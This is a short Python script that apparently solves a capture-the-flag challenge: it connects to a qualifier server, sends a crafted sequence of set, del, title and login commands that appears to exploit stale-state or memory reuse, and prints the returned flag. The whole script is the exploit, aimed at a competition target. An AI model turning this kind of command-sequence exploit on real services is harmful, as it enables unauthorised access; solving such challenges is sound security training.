#!/usr/bin/python

import socket

def recv_flag(s):
	flag = ""
	while True:
		data = s.recv(4000)
		if "SCE{" in data:
			flag = 'SCE{' + data.split('SCE{')[1].split('}')[0] + '}'
			break
	return flag

HOST = 'quals.shadow-league.org'  # The server's hostname or IP address
PORT = 5001       # The port used by the server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send("set aaaaaa\n")
s.send("del\n")
s.send("title aaaaaaaaaaaaaaaaaaaaaaa\n")
s.send("login\n")

print recv_flag(s)

s.close()

